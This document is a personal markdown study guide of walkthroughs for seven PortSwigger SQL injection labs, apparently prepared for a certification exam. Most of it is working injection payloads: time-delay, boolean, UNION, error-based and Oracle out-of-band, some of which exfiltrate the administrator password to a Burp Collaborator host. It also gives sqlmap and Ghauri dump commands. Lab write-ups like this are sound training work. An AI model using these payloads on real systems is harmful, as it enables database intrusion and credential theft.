## Approach

1. Use ***Burp Scanner*** on:
	- Advance search
	- Category filter
	- **TrackingId** cookie
	- Anything that could require database comparison
2. Most of the SQL cases can be solved with ***SQLMAP*** unless it's **time delay**, **OOB**, and **error-based**
## Labs
### [1. Blind SQL injection with time delays and information retrieval](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval)

> [!NOTE] 
> A blind SQLi in `TrackingId` cookie that can be exploited using time delay
#### Manual

**Time based SQLi detection**

> Here, the injection point is at the cookie, we can try a sleep SQLi
```sql
Cookie: TrackingId=[TRACKING]'||(SELECT pg_sleep(10))--;
```

**Time based SQLi table name guessing**

> Guessing if there's table called **users**
```sql
Cookie: TrackingId=[TRACKING]'||(SELECT CASE WHEN ((SELECT 1 FROM information_schema.columns WHERE table_name = 'users' LIMIT 1)=1) THEN pg_sleep(10) ELSE pg_sleep(0) END)--;
```

**Timing based SQLi user guessing**

> Guessing if there's a user called **administrator**, also we remove `LIMIT` because we're already selecting **one user**
```sql
Cookie: TrackingId=[TRACKING]'||(SELECT CASE WHEN ((SELECT 1 FROM users WHERE username='administrator')=1) THEN pg_sleep(10) ELSE pg_sleep(0) END)--;
```

**Timing based SQLi password length guessing**

> Use ***Burp Intruder*** to guess the length of **administrator's** password
> Note: look at `[INTRUDER]`, that's the **payload position**
```sql
Cookie: TrackingId=[TRACKING]'||(SELECT CASE WHEN ((SELECT 1 FROM users WHERE username='administrator' AND LENGTH(password)=[INTRUDER])=1) THEN pg_sleep(10) ELSE pg_sleep(0) END)--;
```

> **Numbers** payload **1 to 30, step 1**
![](attachments/Pasted%20image%2020260104203456.png)

**Timing based SQLi password guessing**

> - `[INTRUDER1]`, is the index of password being guessed
> - `[INTRUDER2]`, is the char value of the index
```sql
Cookie: TrackingId=[TRACKING]'||(SELECT CASE WHEN ((SELECT 1 FROM users WHERE username='administrator' AND SUBSTRING(password, [INTRUDER1], 1)='[INTRUDER2]')=1) THEN pg_sleep(10) ELSE pg_sleep(0) END)--;
```

> - `[INTRUDER1]`, **Numbers** payload, from 1 - 20
> - `[INTRUDER2]`, **Simple list** payload, a-z, A-Z, 0-9
![](attachments/Pasted%20image%2020260104204356.png)
![](attachments/Pasted%20image%2020260104205256.png)
#### Automated

> [!warning] 
> - Still don't know how to make it effective, it's very time consuming to the point of being unusable for time delay cases
> - Also the fastest method still involve a lot of monitoring, this is due to SQLMAP trying to retrieve everything BUT since time delay SQL tends to involve a very slow guessing process, this is ineffective, that's why we need to stop the scan if it already has the data we want
> - Do ***Burp Scanner*** first and detect the properties of the SQL:
> 	- Injection point
> 	- DB tech (PostgreSQL, MySQL, etc.)
> 	- Technique (Time Delay, etc.)
> - As time comparison doing this lab manually cost me 9 mins, with ***SQLMAP*** 25 mins and ***Ghauri*** 53 mins, so only use this if you still need to finish the other app in BSCP
##### SQLMAP

**Enumerate database**

> Target database is **public**
```bash
sqlmap --url "https://[LAB_URL]/filter?category=Gifts" --cookie="TrackingId=[TRACKING]*; session=[SESSION]" --level 5 --risk 3 --batch --dump --dbms=[DBTECH] --technique=T --dbs --tamper=space2comment --random-agent
```

**Enumerate table**

> Target table is **users**
```bash
sqlmap --url "https://[LAB_URL]/filter?category=Gifts" --cookie="TrackingId=[TRACKING]*; session=[SESSION]" --level 5 --risk 3 --batch --dump --dbms=[DBTECH] --technique=T -D [DB] --tables
```

**Guess user**

> - User **administrator** exists
> - Note: assuming there's a column called **username** 
```bash
sqlmap --url "https://[LAB_URL]/filter?category=Gifts" --cookie="TrackingId=[TRACKING]*; session=[SESSION]" --level 5 --risk 3 --batch --dump --dbms=[DBTECH] --technique=T -D [DB] -T [TABLE] -C [COLUMN] --where="[COLUMN]='[USERNAME]'"
```

**Guess password**

```bash
sqlmap --url "https://[LAB_URL]/filter?category=Gifts" --cookie="TrackingId=[TRACKING]*; session=[SESSION]" --level 5 --risk 3 --batch --dump --dbms=[DBTECH] --technique=T -D [DB] -T [TABLE] -C [COLUMN] --where="[COLUMN]='[USERNAME]'"
```

##### Ghauri

**Enumerate database**

> `[FILE].txt` comes from the actual request, just `Ctrl + a` and copy paste to the file
```sql
ghauri -r [FILE].txt --technique T --dbms postgreSQL --dbs --dump --batch
```
### [2. Blind SQL injection with out-of-band data exfiltration](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration)

> [!NOTE] 
> Blind SQL injection using OOB, this one is **Oracle**

**Detecting SQLi**

> - This SQLi using OOB, this is the payload for ***Oracle*** database
> - `<@burp_urlencode>`, this part is from the ***Hackvertor*** extension
```sql
Cookie: TrackingId=[TRACKING]<@burp_urlencode>'||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % nrqzk SYSTEM "http://[BURP_COLLABORATOR]/">%nrqzk;]>'),'/l') from dual)||'</@burp_urlencode>;
```

**Guess table name**

> - Confirming there's a table named **USERS**
> - Note: Oracle has a unique quirk IDK if others have it also, but table names are stored in the database in uppercase
```sql
Cookie: TrackingId=[TRACKING]<@burp_urlencode>'||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % nrqzk SYSTEM "http://'||(SELECT table_name from all_tables WHERE table_name = 'USERS')||'.[BURP_COLLABORATOR]/">%nrqzk;]>'),'/l') from dual)||'</@burp_urlencode>;
```

**Guess column name**

> - Confirming there's a column in **USERS** table named **USERNAME**
> - Note: Oracle has a unique quirk IDK if others have it also, but column names are stored in the database in uppercase
```sql
Cookie: TrackingId=[TRACKING]<@burp_urlencode>'||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % nrqzk SYSTEM "http://'||(SELECT column_name from all_tab_columns WHERE table_name = 'USERS' AND column_name = 'USERNAME')||'.[BURP_COLLABORATOR]/">%nrqzk;]>'),'/l') from dual)||'</@burp_urlencode>;
```

> - Confirming there's a column in **USERS** table named **PASSWORD**
> - Note: Oracle has a unique quirk IDK if others have it also, but column names are stored in the database in uppercase
```sql
Cookie: TrackingId=[TRACKING]<@burp_urlencode>'||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % nrqzk SYSTEM "http://'||(SELECT column_name from all_tab_columns WHERE table_name = 'USERS' AND column_name = 'USERNAME')||'.[BURP_COLLABORATOR]/">%nrqzk;]>'),'/l') from dual)||'</@burp_urlencode>;
```

**Guess username**

> - Confirming there's a user called **administrator**
```sql
Cookie: TrackingId=[TRACKING]<@burp_urlencode>'||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % nrqzk SYSTEM "http://'||(SELECT username from users WHERE username = 'administrator')||'.[BURP_COLLABORATOR]/">%nrqzk;]>'),'/l') from dual)||'</@burp_urlencode>;
```

**Exfiltrating password**

```sql
Cookie: TrackingId=[TRACKING]<@burp_urlencode>'||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % nrqzk SYSTEM "http://'||(SELECT password from users WHERE username = 'administrator')||'.[BURP_COLLABORATOR]/">%nrqzk;]>'),'/l') from dual)||'</@burp_urlencode>;
```

### [3. Blind SQL injection with out-of-band interaction](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band)

> [!NOTE] 
> Blind SQLi executing OOB

**Blind SQLi DNS lookup**

> - In this case, the DB is ***Oracle***
> - `<@burp_urlencode>` is from ***Hackvertor*** extension
```sql
Cookie: TrackingId=[TRACKING]<@burp_urlencode>'||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % jtole SYSTEM "http://[BURP_COLLABORATOR]/">%jtole;]>'),'/l') from dual)||'</@burp_urlencode>
```

### [4. Blind SQL injection with conditional responses](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses)

> [!NOTE] 
> The response is dependent on whether the SQL query is false or true, we can see this based on a `Welcome back!` message in the navbar that only appears is the query is true
#### Manual

**Detect SQLi**

> Adding a `'` triggers an error that stops the "Welcome back!" message from appearing
```sql
Cookie: TrackingId=[TRACKING]';
```

> Ending with a `--` makes "Welcome back!" message appears again, confirming SQLi
```sql
Cookie: TrackingId=[TRACKING]'--;
```

**Guessing table name**

> Confirming if there's `users` table
```sql
Cookie: TrackingId=dEC3i76ZmvqiqCDs' AND ((SELECT 1 FROM information_schema.tables WHERE table_name='users')=1)--;
```

**Guessing column name**

> Confirming if there's `username` column inside `users` table
```sql
Cookie: TrackingId=dEC3i76ZmvqiqCDs' AND ((SELECT 1 FROM information_schema.columns WHERE table_name='users' AND column_name='username')=1)--;
```

> Confirming if there's `password` column inside `users` table
```sql
Cookie: TrackingId=dEC3i76ZmvqiqCDs' AND ((SELECT 1 FROM information_schema.columns WHERE table_name='users' AND column_name='password')=1)--;
```

**Guessing user**

> Confirming if there's `administrator` user
```sql
Cookie: TrackingId=dEC3i76ZmvqiqCDs' AND ((SELECT 1 FROM users WHERE username='administrator')=1)--;
```

**Brute force password length**

> - `[INTRUDER]` is the payload position to use in ***Burp Intruder***, payload type **Number**, from 1 to 30
> - Password length for this lab is 20 char
```sql
Cookie: TrackingId=dEC3i76ZmvqiqCDs' AND ((SELECT 1 FROM users WHERE username='administrator' AND LENGTH(password)=[INTRUDER])=1)--;
```

**Brute force password**

> `[INTRUDER1]` payload position 1 for ***Burp Intruder***, payload type **Number**, from 1 to 20
> `[INTRUDER2]` payload position 2 for ***Burp Intruder***, payload type **Simple list**, a-zA-Z0-9 
```sql
Cookie: TrackingId=dEC3i76ZmvqiqCDs' AND ((SELECT 1 FROM users WHERE username='administrator' AND SUBSTRING(password, [INTRUDER1], 1)='[INTRUDER2]')=1)--;
```
#### Automated 
##### SQLMAP 

> Estimation 7 min
```bash
sqlmap -r [FILE].txt --dump --level 5 --risk 3 --batch --dbms=postgresql --technique=BESQ -tamper=space2comment --random-agent --force-ssl
```
##### Ghauri 

> Estimation 15 min
```bash
ghauri -r [FILE].txt --dump --batch --level 3 --technique BES --dbms=postgresql
```

### [5. SQL injection attack, listing the database contents on Oracle](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle)

> [!NOTE] 
> - UNION SQLi ***Oracle*** DB
> - Recommended using automated tools ***SQLMAP*** (2 mins)
#### Manual

**Detect SQLi**

> Error
```sql
category=Accessories'
```

> No error
```sql
category=Accessories'--
```

**Confirm UNION SQLi is possible**

> - We know it's ***Oracle*** from the ***Burp Scanner***
> - Since the **category** param is used to return data, we know that this query will result in reflected data
> - Confirmed UNION is possible
> - Confirmed UNION SQLi column have 2
```sql
category=Accessories' UNION SELECT NULL,NULL FROM DUAL--
```

**Confirmed SELECT returns string data**

> First column of SELECT query is string
```sql
category=Accessories' UNION SELECT 'a',NULL FROM DUAL--
```

**Get all tables**

> - Retrieve a table called `USERS_[STRING]`
> - Put `table_name` in the first SELECT query column
```sql
category=Accessories' UNION SELECT table_name,NULL FROM all_tables--
```

**Get all columns**

> Retrieve columns `USERNAME_[STRING]` and `PASSWORD_[STRING]`
```sql
category=Accessories' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS_RABRYV'--
```

**Get username and password**

> Retrieve `administrator~[password]`
```sql
category=Accessories' UNION SELECT USERNAME_[STRING]||'~'||PASSWORD_[STRING],NULL FROM USERS_[STRING]--
```
#### Automated

> I recommend identifying this first about the DB (Use ***Burp Scanner***):
> - DB tech (PostgreSQL, Oracle, etc.)
> - Injection point
> - Blind or not? (manual)
##### SQLMAP

```bash
sqlmap -r [FILE].txt --level 5 --risk 3 --batch --dump --force-ssl --dbms=oracle
```

### [6. SQL injection attack, listing the database contents on non-Oracle databases](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle)

> [!NOTE] 
> - UNION SQLi ***PostgreSQL*** DB
> - Recommended using automated tools ***SQLMAP*** (2 mins)
#### Manual

**Detect SQLi**

> Error
```sql
category=Gifts'
```

> No error
```sql
category=Gifts'--
```

**Confirm UNION SQLi is possible**

> - We know it's ***PostgreSQL*** from the ***Burp Scanner***
> - Since the **category** param is used to return data, we know that this query will result in reflected data
> - Confirmed UNION is possible
> - Confirmed UNION 2 columns because of no error
```sql
category=Gifts' UNION SELECT NULL,NULL--
```

**Confirm which SELECT column returns string**

> First column returns string because no error
```sql
category=Gifts' UNION SELECT 'a',NULL--
```

**Get all tables**

> - Retrieve a table called `users_[STRING]`
> - Put the column in the part of the SELECT query that returns string data, in this case it's the first column
```sql
category=Gifts' UNION SELECT table_name,NULL FROM information_schema.tables--
```

**Get all columns**

> Retrieve columns `USERNAME_[STRING]` and `PASSWORD_[STRING]`
```sql
category=Gifts' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users_[STRING]'--
```

**Get username and password**

> Retrieve `administrator~[password]`
```sql
category=Gifts' UNION SELECT username_[STRING]||'~'||password_[STRING],NULL FROM users_[STRING]--
```
#### Automated
#### SQLMAP

> I recommend identifying this first about the DB (Use ***Burp Scanner***):
> - DB tech (PostgreSQL, Oracle, etc.)
> - Injection point
> - Blind or not? (manual)
```bash
sqlmap -r [FILE].txt --level 5 --risk 3 --batch --dump --force-ssl --dbms=postgresql
```

### [7. Visible error-based SQL injection](https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based)

> [!NOTE] 
> - Visible error message and verbose allowing SQLi using `CAST` method
> - Automated tool does not work
#### Manual

**Detecting SQLi**

> There's an error
```sql
Cookie: TrackingId=';
```

> There's no error
```sql
Cookie: TrackingId='--;
```

**Guess user**

> - Since error is visible and verbose, we can use `CAST` to trigger a subquery call but still result in an error, resulting in the subquery value being shown in the error because it's trying to cast the string as int
> - We know the format is ***PostgreSQL*** from ***Burp Scanner***
> - This is minimized version of the usual `CAST` SQLi due to a length limit being applied to the query, like about 100 chars
> - Retrieve first user that is `administrator`
```sql
Cookie: TrackingId='||(CAST((SELECT username FROM users LIMIT 1) AS int))--
```

**Guess password**

> Retrieve `administrator`'s password
```sql
Cookie: TrackingId='||(CAST((SELECT password FROM users LIMIT 1) AS int))--
```

## Cheat Sheet

https://portswigger.net/web-security/sql-injection/cheat-sheet
> Portswigger cheatsheet

https://onecompiler.com/
> SQL IDE online

https://github.com/sqlmapproject/sqlmap/wiki/usage
> SQLMAP wiki

https://github.com/r0oth3x49/ghauri
> Ghauri wiki